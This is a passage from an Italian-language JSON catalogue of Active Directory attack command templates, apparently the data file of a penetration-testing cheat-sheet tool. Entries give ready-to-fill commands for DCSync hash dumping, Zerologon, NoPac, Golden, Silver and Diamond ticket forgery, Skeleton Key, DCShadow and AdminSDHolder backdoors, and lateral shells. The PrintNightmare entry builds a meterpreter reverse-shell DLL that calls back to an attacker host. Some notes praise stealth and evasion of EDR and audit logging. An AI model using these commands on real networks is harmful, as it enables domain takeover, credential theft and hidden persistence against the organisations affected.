    "note": "# Prossimo passo\nCon la scrittura su una GPO: ti aggiungi come admin locale sulle macchine nel suo scope, o piazzi uno scheduled task. L’effetto parte al prossimo gpupdate. Colpisci una GPO linkata a una OU con molti host.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "sharpgpoabuse",
      "gpo"
    ],
    "template": ".\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName \"<gpo>\"",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "gpo",
        "label": "GPO",
        "placeholder": "Default Domain Policy"
      },
      {
        "key": "cmd",
        "label": "Comando",
        "placeholder": "net user hacker P@ss123! /add"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Add local admin",
        "template": ".\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName \"<gpo>\"",
        "description": "Aggiunge l’utente agli admin locali nello scope della GPO."
      },
      {
        "id": "task",
        "label": "Scheduled task",
        "template": ".\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author <user> --Command \"cmd.exe\" --Arguments \"/c <cmd>\" --GPOName \"<gpo>\"",
        "description": "Esegue un comando come SYSTEM sulle macchine nello scope."
      }
    ]
  },
  {
    "id": "dcsync",
    "name": "DCSync — secretsdump -just-dc",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "DCSync",
    "description": "Simula la replica fra domain controller per estrarre gli hash direttamente dal DC, senza eseguire codice su di esso. Richiede i diritti di replica, che appartengono a Domain Admins e agli account su cui sono stati concessi via WriteDACL. `-just-dc-ntlm` preleva i soli hash NTLM, `-just-dc-user <utente>` limita a un singolo account come krbtgt.",
    "note": "# Prerequisiti\nServono i diritti di replica (DS-Replication-Get-Changes), di Domain Admins o concessi via ACL abuse. -just-dc-ntlm estrae gli hash senza eseguire codice sul DC. Punta a krbtgt (per i Golden Ticket) e administrator.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "dcsync"
    ],
    "tags": [
      "dcsync",
      "secretsdump",
      "impacket"
    ],
    "template": "impacket-secretsdump <domain>/<user>:<password>@<ip> -just-dc-ntlm",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Tutti NTLM",
        "template": "impacket-secretsdump <domain>/<user>:<password>@<ip> -just-dc-ntlm",
        "description": "Hash NTLM di tutto il dominio."
      },
      {
        "id": "krbtgt",
        "label": "Solo krbtgt",
        "template": "impacket-secretsdump <domain>/<user>:<password>@<ip> -just-dc-user krbtgt",
        "description": "Hash del `krbtgt` (per il Golden Ticket)."
      }
    ]
  },
  {
    "id": "zerologon",
    "name": "Zerologon (CVE-2020-1472)",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "CVE",
    "description": "Sfrutta un difetto crittografico di Netlogon: con circa 2000 tentativi si azzera la password dell'account macchina del domain controller, senza alcuna credenziale. Con l'account macchina a password vuota si fa poi il DCSync del krbtgt e di tutto il dominio.",
    "note": "# Ripristino OBBLIGATORIO\nAzzerare la password del DC lo scollega dal dominio e può romperlo. Dopo aver estratto gli hash, recupera la password originale del DC$ dal registro (usando l'Administrator ottenuto) e ripristinala con `restorepassword.py`. In un lab usa-e-getta si può saltare, in un assessment reale MAI.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "rpc"
    ],
    "tags": [
      "zerologon",
      "cve-2020-1472",
      "netlogon"
    ],
    "template": "python3 zerologon_tester.py <dchost> <ip>",
    "params": [
      {
        "key": "dchost",
        "label": "DC hostname",
        "placeholder": "DC01"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      }
    ],
    "variants": [
      {
        "id": "scan",
        "label": "Check (tester)",
        "template": "python3 zerologon_tester.py <dchost> <ip>",
        "description": "Verifica se il DC è vulnerabile senza modificarlo: `Success! DC is vulnerable` = attaccabile, `Attack failed after 2000 attempts` = patchato."
      },
      {
        "id": "default",
        "label": "Exploit + DCSync",
        "template": "# azzera la password del computer account del DC\npython3 set_empty_pw.py <dchost> <ip>\n\n# con la password vuota, replica gli hash del dominio\nimpacket-secretsdump '<domain>/<dchost>$@<ip>' -no-pass -just-dc",
        "description": "Azzera la password del DC$ e con l'account macchina vuoto fa il DCSync di tutti gli hash, krbtgt compreso. Subito dopo va ripristinata la password (vedi nota)."
      },
      {
        "id": "nxc",
        "label": "Check (netexec)",
        "template": "nxc smb <ip> -u '' -p '' -M zerologon",
        "description": "Stesso check tramite modulo netexec, senza credenziali: comodo se non hai i tool di dirkjanm sottomano."
      }
    ]
  },
  {
    "id": "nopac",
    "name": "NoPac (CVE-2021-42278/42287)",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "CVE",
    "description": "Un qualsiasi account di dominio, con `MAQ > 0`, permette di ottenere SYSTEM sul DC sfruttando l'incoerenza sAMAccountName. `-shell` apre una shell, `-dump` esegue direttamente il DCSync.",
    "note": "# Prerequisiti\nServe MachineAccountQuota>0 (vedi nxc --vulncheck) e il DC non patchato. -shell apre una shell SYSTEM sul DC, -dump fa il dump degli hash. Uno dei percorsi più diretti da semplice utente a Domain Admin.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "nopac",
      "cve-2021-42278",
      "sambacry"
    ],
    "template": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <ip> -dc-host <dchost> -shell --impersonate administrator -use-ldap",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "dchost",
        "label": "DC hostname",
        "placeholder": "DC01"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Shell",
        "template": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <ip> -dc-host <dchost> -shell --impersonate administrator -use-ldap",
        "description": "Shell SYSTEM sul DC."
      },
      {
        "id": "dump",
        "label": "DCSync",
        "template": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <ip> -dc-host <dchost> --impersonate administrator -use-ldap -dump",
        "description": "Dump diretto degli hash, senza shell."
      },
      {
        "id": "scan",
        "label": "Scan",
        "template": "sudo python3 scanner.py <domain>/<user>:<password> -dc-ip <ip> -use-ldap",
        "description": "Verifica se il DC è vulnerabile."
      }
    ]
  },
  {
    "id": "printnightmare",
    "name": "PrintNightmare — CVE-2021-1675 / 34527",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "CVE",
    "description": "Con il Print Spooler del DC attivo si carica una DLL malevola via MS-RPRN ottenendo esecuzione come SYSTEM sul domain controller. Il servizio va prima verificato e la DLL ospitata su una share SMB.",
    "note": "# Prerequisiti\nServe il Print Spooler attivo sul DC (verifica con rpcdump). Carichi una DLL via MS-RPRN per esecuzione SYSTEM; ospita la DLL su una share accessibile. Rischio di instabilità del servizio: usalo con criterio.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "rpc",
      "smb"
    ],
    "tags": [
      "printnightmare",
      "cve-2021-1675",
      "rce"
    ],
    "template": "python3 CVE-2021-1675.py <domain>/<user>:'<password>'@<ip> '\\\\<lhost>\\share\\payload.dll'",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "lhost",
        "label": "LHOST (SMB)",
        "placeholder": "10.10.14.5"
      }
    ],
    "variants": [
      {
        "id": "scan",
        "label": "Verifica vulnerabilità",
        "template": "impacket-rpcdump @<ip> | egrep 'MS-RPRN|MS-PAR'",
        "description": "Controlla che il Print Spooler (MS-RPRN) sia esposto sul DC."
      },
      {
        "id": "default",
        "label": "Exploit (cube0x0)",
        "template": "# genera la DLL con il payload meterpreter\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=8080 -f dll -o payload.dll\n\n# la pubblica su una share SMB raggiungibile dal target\nsudo impacket-smbserver -smb2support share ./\n\n# fa caricare la DLL allo spooler del target\npython3 CVE-2021-1675.py <domain>/<user>:'<password>'@<ip> '\\\\<lhost>\\share\\payload.dll'",
        "description": "Genera la DLL, la ospita via SMB e la esegue come SYSTEM sul DC."
      }
    ],
    "refs": [
      {
        "label": "cube0x0 — CVE-2021-1675",
        "url": "https://github.com/cube0x0/CVE-2021-1675"
      }
    ]
  },
  {
    "id": "badsuccessor",
    "name": "BadSuccessor (dMSA, 2025)",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "dMSA / BadSuccessor",
    "description": "Tecnica Akamai del 2025: con il diritto di creare oggetti in una OU si crea una delegated Managed Service Account (dMSA) e la si fa succedere a un account privilegiato, ereditandone le chiavi Kerberos. Richiede un DC Windows Server 2025.",
    "note": "# Interpretazione\nIl link di migrazione della dMSA fa ereditare le chiavi dell account precedente: ottieni di fatto le credenziali del target senza toccarne la password.\n# Errori comuni\nFunziona solo su domini con DC Server 2025 (dove esistono le dMSA) e serve CreateChild su una OU. Su domini più vecchi non è applicabile.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "kerberos"
    ],
    "tags": [
      "bloodyad",
      "dmsa",
      "badsuccessor",
      "2025"
    ],
    "template": "# crea una dMSA che succede a un account privilegiato (serve CreateChild sulla OU)\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add badSuccessor <dmsa> --target <target>",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "dmsa",
        "label": "Nome dMSA",
        "placeholder": "evil_dmsa"
      },
      {
        "key": "target",
        "label": "Account target",
        "placeholder": "administrator"
      }
    ]
  },
  {
    "id": "trust-extrasid",
    "name": "Trust child, parent (ExtraSID)",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "Domain Trust",
    "description": "Compromesso un child domain, sali al parent: Golden Ticket del child con il SID degli Enterprise Admins del parent (`<parentsid>-519`) iniettato come ExtraSID. Serve il krbtgt del child.",
    "note": "# Prerequisiti\nCompromesso un child domain, sali al parent: Golden Ticket del child con il SID degli Enterprise Admins del parent (SID dominio seguito da -519) come ExtraSID. Serve l’hash del krbtgt del child (via DCSync). I trust intra-forest non filtrano i SID.",
    "platform": "cross-platform",
    "requires": [
      "hash"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "trust",
      "extrasid",
      "sid-history"
    ],
    "template": "impacket-ticketer -nthash <krbtgt> -domain <childdomain> -domain-sid <childsid> -extra-sid <parentsid>-519 hacker",
    "params": [
      {
        "key": "krbtgt",
        "label": "krbtgt child",
        "placeholder": "<nt-hash>"
      },
      {
        "key": "childdomain",
        "label": "Child domain",
        "placeholder": "sub.corp.local"
      },
      {
        "key": "childsid",
        "label": "Child SID",
        "placeholder": "S-1-5-21-..."
      },
      {
        "key": "parentsid",
        "label": "Parent SID",
        "placeholder": "S-1-5-21-..."
      },
      {
        "key": "parentdc",
        "label": "Parent DC (FQDN)",
        "placeholder": "dc.corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "placeholder": "jdoe",
        "ctx": "user"
      },
      {
        "key": "password",
        "label": "Password",
        "placeholder": "P@ssw0rd",
        "ctx": "password"
      },
      {
        "key": "parentdcip",
        "label": "Parent DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.5"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Manuale (ticketer)",
        "template": "# forgia un golden ticket con il SID degli Enterprise Admins del dominio padre\nimpacket-ticketer -nthash <krbtgt> -domain <childdomain> -domain-sid <childsid> -extra-sid <parentsid>-519 hacker\n\n# punta la cache Kerberos al ticket forgiato\nexport KRB5CCNAME=hacker.ccache\n\n# usa il ticket per una shell sul DC del dominio padre\nimpacket-psexec <childdomain>/hacker@<parentdc> -k -no-pass",
        "description": "Crei il ticket con l'ExtraSID, lo carichi e accedi al parent DC."
      },
      {
        "id": "shortcut",
        "label": "Automatico (raiseChild)",
        "template": "impacket-raiseChild -target-exec <parentdcip> <childdomain>/<user>:<password>",
        "description": "Fa tutto in un comando (dump `krbtgt`, SID, ticket, exec)."
      }
    ]
  },
  {
    "id": "golden-ticket",
    "name": "Golden Ticket — krbtgt",
    "category": "active-directory",
    "subcategory": "persistence",
    "group": "Ticket Forgery",
    "description": "Con l’hash del `krbtgt` e il SID di dominio forgi un TGT per qualsiasi utente: accesso persistente finché il `krbtgt` non viene cambiato 2 volte.",
    "note": "# Attenzione\nPersistenza massima ma rumorosa: con l’hash del krbtgt forgi TGT per chiunque, validi finché il krbtgt non viene cambiato due volte. Solo entro lo scope. Il Silver Ticket è più silenzioso se basta un singolo servizio.",
    "platform": "cross-platform",
    "requires": [
      "hash"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "golden-ticket",
      "krbtgt",
      "persistence"
    ],
    "template": "impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain <domain> Administrator",
    "params": [
      {
        "key": "krbtgt",
        "label": "krbtgt hash",
        "placeholder": "<nt-hash>"
      },
      {
        "key": "sid",
        "label": "Domain SID",
        "placeholder": "S-1-5-21-..."
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux (ticketer)",
        "template": "impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain <domain> Administrator",
        "description": "Crea `Administrator.ccache`; poi `export KRB5CCNAME=Administrator.ccache`."
      },
      {
        "id": "mimikatz",
        "label": "Windows (mimikatz)",
        "template": ".\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /krbtgt:<krbtgt> /ptt\" \"exit\"",
        "description": "Forgia e inietta (`/ptt`) il ticket in memoria."
      }
    ]
  },
  {
    "id": "getst-s4u",
    "name": "impacket-getST — S4U2Self / S4U2Proxy",
    "category": "active-directory",
    "subcategory": "persistence",
    "group": "Ticket Forgery",
    "description": "Forgia un service ticket a nome di un altro utente tramite la catena S4U2Self e S4U2Proxy, indirizzato a uno specifico SPN del target. È il passo finale sia del Resource-Based Constrained Delegation sia della delega vincolata classica: con il ticket in mano si accede al servizio come l'utente impersonato, tipicamente Administrator verso CIFS o HOST.",
    "note": "# Uso del ticket\ngetST salva un file `.ccache`. Va esportato con `export KRB5CCNAME=Administrator.ccache` prima di lanciare psexec o wmiexec con l'opzione `-k -no-pass`.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "impacket",
      "s4u"
    ],
    "template": "impacket-getST -spn 'cifs/<target>' -impersonate '<impersonate>' '<domain>/<user>:<password>'",
    "params": [
      {
        "key": "target",
        "label": "Target FQDN",
        "placeholder": "ws01.corp.local"
      },
      {
        "key": "impersonate",
        "label": "Impersonate",
        "placeholder": "administrator"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "Attacker",
        "ctx": "user",
        "placeholder": "ATK01$"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "silver-ticket",
    "name": "Silver Ticket — servizio",
    "category": "active-directory",
    "subcategory": "persistence",
    "group": "Ticket Forgery",
    "description": "Ticket forgiato per UN singolo servizio: non serve il `krbtgt`, basta l’hash dell’account di servizio/computer. Più silenzioso del Golden (non passa dal DC).",
    "note": "# Quale variante usare\nForgiato per UN servizio (CIFS, HTTP, MSSQL): basta l’hash dell’account di servizio o del computer, niente krbtgt e nessun passaggio dal DC, quindi più silenzioso del Golden. Accesso mirato e persistente a un host.",
    "platform": "cross-platform",
    "requires": [
      "hash"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "silver-ticket",
      "kerberos"
    ],
    "template": "impacket-ticketer -nthash <servicehash> -domain-sid <sid> -domain <domain> -spn <spn> Administrator",
    "params": [
      {
        "key": "servicehash",
        "label": "Hash servizio",
        "placeholder": "<nt-hash>"
      },
      {
        "key": "sid",
        "label": "Domain SID",
        "placeholder": "S-1-5-21-..."
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "spn",
        "label": "SPN",
        "placeholder": "cifs/ws01.corp.local"
      },
      {
        "key": "target",
        "label": "Host target",
        "placeholder": "sql01.corp.local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux (ticketer)",
        "template": "impacket-ticketer -nthash <servicehash> -domain-sid <sid> -domain <domain> -spn <spn> Administrator",
        "description": "Crea il ticket per lo SPN indicato."
      },
      {
        "id": "mimikatz",
        "label": "Windows (mimikatz)",
        "template": ".\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /rc4:<servicehash> /target:<target> /service:cifs /ptt\" \"exit\"",
        "description": "Forgia e inietta il silver ticket per `cifs` sul target."
      }
    ]
  },
  {
    "id": "diamond-ticket",
    "name": "Diamond Ticket (Rubeus)",
    "category": "active-directory",
    "subcategory": "persistence",
    "group": "Ticket Forgery",
    "description": "Variante più furtiva del Golden Ticket: invece di forgiare un TGT da zero, se ne richiede uno legittimo al DC e lo si modifica usando la chiave AES di krbtgt. Il ticket risultante ha campi coerenti e supera i controlli che smascherano i golden grezzi.",
    "note": "# Prerequisito\nChiave AES256 di krbtgt (ottenuta via DCSync). Senza quella non si forgia nulla.\n# Interpretazione\nIl diamond mantiene i metadati del TGT reale (PAC, timestamp), quindi è meno rilevabile del golden. Persistenza finché non si ruota due volte la password di krbtgt.",
    "platform": "windows",
    "requires": [
      "hash"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "rubeus",
      "diamond-ticket",
      "kerberos",
      "forgery"
    ],
    "template": "# forgia un diamond ticket modificando un TGT legittimo\nRubeus.exe diamond /krbkey:<krbkey> /user:<user> /password:<password> /ticketuser:administrator /ticketuserid:500 /groups:512 /domain:<domain> /dc:<dc>",
    "params": [
      {
        "key": "krbkey",
        "label": "krbtgt AES256",
        "placeholder": "aad3b..."
      },
      {
        "key": "user",
        "label": "User (per TGT reale)",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "dc",
        "label": "DC FQDN",
        "placeholder": "dc01.corp.local"
      }
    ]
  },
  {
    "id": "golden-cert",
    "name": "Golden Certificate (Certipy)",
    "category": "active-directory",
    "subcategory": "persistence",
    "group": "Golden Certificate",
    "description": "Ruba la chiave privata della CA aziendale e la usa per forgiare certificati di autenticazione validi per qualunque utente. Persistenza di lungo periodo: resta valida finché non scade (o non viene revocato) il certificato della CA, cosa rara.",
    "note": "# Prerequisito\nAccesso amministrativo alla CA (per il backup della chiave). Una volta in mano la CA pfx, si forgia offline senza più parlare col DC.\n# Interpretazione\nUn certificato forgiato con la chiave della CA e indistinguibile da uno legittimo: autentica come administrator a piacere. La rotazione delle password non lo invalida.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "certipy",
      "adcs",
      "golden-certificate",
      "persistence"
    ],
    "template": "# 1. backup del certificato e chiave privata della CA\ncertipy-ad ca -backup -ca <ca> -u <user>@<domain> -p '<password>' -dc-ip <ip>\n\n# 2. forgia offline un cert per un utente privilegiato\ncertipy-ad forge -ca-pfx <ca>.pfx -upn administrator@<domain>\n\n# 3. autenticati col cert forgiato\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
    "params": [
      {
        "key": "ca",
        "label": "CA name",
        "placeholder": "CORP-DC-CA"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "skeleton-key",
    "name": "Skeleton Key (mimikatz)",
    "category": "active-directory",
    "subcategory": "persistence",
    "group": "Backdoor",
    "description": "Inietta una skeleton key nel LSASS del DC: ogni account si autentica anche con la password `mimikatz`. Non persiste al riavvio, serve DA sul DC.",
    "note": "# Attenzione\nNon persiste al riavvio (vive nel LSASS del DC) e indebolisce tutto il dominio: ogni account accetta anche la password mimikatz. Serve DA sul DC. Solo entro lo scope, da rimuovere a fine test.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "mimikatz",
      "skeleton-key"
    ],
    "template": ".\\mimikatz.exe \"privilege::debug\" \"misc::skeleton\" \"exit\"",
    "params": []
  },
  {
    "id": "dsrm",
    "name": "DSRM admin",
    "category": "active-directory",
    "subcategory": "persistence",
    "group": "Backdoor",
    "description": "La password DSRM è l’admin locale del DC: abilita il logon via rete nel registro, poi fai Pass-the-Hash con l’hash DSRM. Persiste al riavvio.",
    "note": "# Prerequisiti\nLa password DSRM è l’admin locale del DC: abiliti il logon via rete nel registro (DsrmAdminLogonBehavior=2), poi Pass-the-Hash con l’hash DSRM (dal SAM del DC). Persiste al riavvio. Serve già DA per impostarla.",
    "platform": "windows",
    "requires": [
      "hash"
    ],
    "protocols": [],
    "tags": [
      "dsrm",
      "persistence"
    ],
    "template": "# abilita il logon di rete per l'account DSRM\nNew-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD\n\n# pass-the-hash con l'hash DSRM, apre una PowerShell\n.\\mimikatz.exe \"sekurlsa::pth /domain:<dchost> /user:Administrator /ntlm:<dsrmhash> /run:powershell.exe\" \"exit\"",
    "params": [
      {
        "key": "dchost",
        "label": "DC hostname",
        "placeholder": "DC01"
      },
      {
        "key": "dsrmhash",
        "label": "DSRM hash",
        "placeholder": "<nt-hash>"
      }
    ]
  },
  {
    "id": "dcshadow",
    "name": "DCShadow (mimikatz)",
    "category": "active-directory",
    "subcategory": "persistence",
    "group": "DCShadow",
    "description": "Registra temporaneamente la macchina come falso Domain Controller e inietta modifiche nella directory tramite replica, senza passare dai log di modifica normali. Serve a piazzare backdoor (SID History, membership, primaryGroupID) in modo furtivo.",
    "note": "# Prerequisito\nDiritti elevati nel dominio (tipicamente Domain Admin) e due sessioni mimikatz: una che fa da server di replica, una che fa il push.\n# Interpretazione\nLe modifiche arrivano via replica DC-to-DC, quindi evitano molte regole di audit sulle modifiche dirette agli oggetti. Ottimo per persistenza silenziosa.",
    "platform": "windows",
    "requires": [
      "hash"
    ],
    "protocols": [
      "dcsync"
    ],
    "tags": [
      "mimikatz",
      "dcshadow",
      "persistence",
      "replication"
    ],
    "template": "# sessione 1 (SYSTEM): registra il falso DC e prepara la modifica\nlsadump::dcshadow /object:<target> /attribute:primaryGroupID /value:512\n\n# sessione 2 (Domain Admin): esegue il push della modifica\nlsadump::dcshadow /push",
    "params": [
      {
        "key": "target",
        "label": "Oggetto target",
        "placeholder": "jdoe"
      }
    ]
  },
  {
    "id": "adminsdholder",
    "name": "AdminSDHolder (SDProp)",
    "category": "active-directory",
    "subcategory": "persistence",
    "group": "AdminSDHolder",
    "description": "Aggiunge una ACE a proprio favore sull oggetto AdminSDHolder. Ogni 60 minuti il processo SDProp ricopia quella ACL su tutti i gruppi protetti (Domain Admins, Enterprise Admins), ripristinando i diritti anche se vengono rimossi.",
    "note": "# Interpretazione\nÈ una backdoor auto-riparante: anche se un difensore toglie i tuoi diritti dai gruppi protetti, SDProp te li ridona al ciclo successivo. Finché l ACE resta su AdminSDHolder.\n# Errori comuni\nServono diritti elevati per scrivere su AdminSDHolder. Ricordarsi che la propagazione non è immediata: attendere il ciclo SDProp.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "powerview",
      "adminsdholder",
      "sdprop",
      "persistence"
    ],
    "template": "# concediti FullControl su AdminSDHolder: SDProp lo propaga ai gruppi protetti\nAdd-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<dc1>,DC=<dc2>' -PrincipalIdentity <user> -Rights All",
    "params": [
      {
        "key": "user",
        "label": "User (principale)",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "dc1",
        "label": "DC comp 1",
        "placeholder": "corp"
      },
      {
        "key": "dc2",
        "label": "DC comp 2",
        "placeholder": "local"
      }
    ]
  },
  {
    "id": "psexec",
    "name": "impacket-psexec — shell SYSTEM",
    "category": "lateral",
    "subcategory": "remote-shells",
    "group": "Impacket Shells",
    "description": "Crea un servizio temporaneo sulla share `ADMIN$` ed esegue come SYSTEM sul target. È il metodo più affidabile per una shell piena, ma anche il più rumoroso, perché scrive un binario su disco e registra un servizio, entrambi eventi che gli EDR intercettano. Richiede privilegi di amministratore locale sul target.",
    "note": "# Attenzione\nCrea un servizio e scrive su disco: molto rilevabile, ma dà SYSTEM diretto. Serve essere admin locale con la share ADMIN$ accessibile. Funziona con password o con -hashes :NTLM (Pass-the-Hash).",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "impacket",
      "psexec"
    ],
    "template": "impacket-psexec <domain>/<user>:<password>@<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "hash",
        "label": "Hash NTLM",
        "placeholder": "aad3b435...",
        "ctx": "hash"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "impacket-psexec <domain>/<user>:<password>@<ip>",
        "description": "Auth con password."
      },
      {
        "id": "hash",
        "label": "Pass-the-Hash",
        "template": "impacket-psexec <domain>/<user>@<ip> -hashes :<hash>",
        "description": "Pass-the-Hash con NTLM (solo la parte NT, dopo i due punti)."
      }
    ]
  },
  {
    "id": "wmiexec",
    "name": "impacket-wmiexec — semi-interattiva",
    "category": "lateral",
    "subcategory": "remote-shells",
    "group": "Impacket Shells",
    "description": "Esegue comandi via WMI e DCOM senza installare un servizio né scrivere sul disco, il che lo rende molto più silenzioso di psexec e meno rilevato dagli EDR. Il prezzo è una shell semi-interattiva che lancia un comando per volta invece di una sessione piena. Funziona con password, hash NTLM o ticket Kerberos.",
    "note": "# Quale variante usare\nPiù silenzioso di psexec: non crea servizi né scrive su disco, esegue via WMI. Shell semi-interattiva (ogni comando è una nuova connessione). Prima scelta quando serve discrezione.",
    "platform": "linux",
    "requires": [
      "password",
      "hash",
      "ticket"
    ],
    "protocols": [
      "rpc",
      "wmi"
    ],
    "tags": [
      "impacket",
      "wmiexec"
    ],
    "template": "impacket-wmiexec <domain>/<user>:<password>@<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "hash",
        "label": "Hash NTLM",
        "placeholder": "aad3b435...",
        "ctx": "hash"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "impacket-wmiexec <domain>/<user>:<password>@<ip>",
        "description": "Auth con password."
      },
      {
        "id": "hash",
        "label": "Pass-the-Hash",
        "template": "impacket-wmiexec <domain>/<user>@<ip> -hashes :<hash>",
        "description": "Pass-the-Hash."
      },
      {
        "id": "kerberos",
        "label": "Kerberos",
        "template": "impacket-wmiexec <domain>/<user>@<ip> -k -no-pass",
        "description": "Usa il ticket in `KRB5CCNAME` (Pass-the-Ticket)."
      }
    ]
  },
  {
    "id": "smbexec",
